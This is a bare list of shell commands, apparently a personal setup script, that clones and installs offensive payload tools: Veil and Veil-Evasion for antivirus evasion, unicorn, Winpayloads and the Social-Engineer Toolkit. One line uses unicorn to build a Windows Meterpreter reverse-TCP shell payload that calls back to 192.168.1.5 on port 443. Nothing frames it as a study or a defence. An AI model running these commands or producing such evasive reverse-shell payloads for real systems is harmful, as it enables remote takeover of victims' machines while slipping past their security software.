cd /opt
git clone https://github.com/Veil-Framework/Veil
######### Veil-Evasion ################
apt-get install python-dev wine1.7
pip install --upgrade pip
pip install pycrypto
cd /opt
git clone https://github.com/Veil-Framework/Veil-Evasion
cd /opt/Veil-Evasion/
bash /opt/Veil-Evasion/setup/setup.sh -s
python Veil-Evasion.py

############################
cd /opt/
git clone https://github.com/Veil-Framework/Veil-Ordnance

#Install Python 2.7
#Install PyCrypto >= 2.3


################## unicorn ######################
cd /opt
git clone https://github.com/trustedsec/unicorn
cd unicorn
python unicorn.py windows/meterpreter/reverse_tcp 192.168.1.5 443
################################################

cd /opt
git clone https://github.com/nccgroup/winpayloads.git
cd winpayloads
./setup.sh
./Winpayloads.py


#https://github.com/trustedsec/social-engineer-toolkit
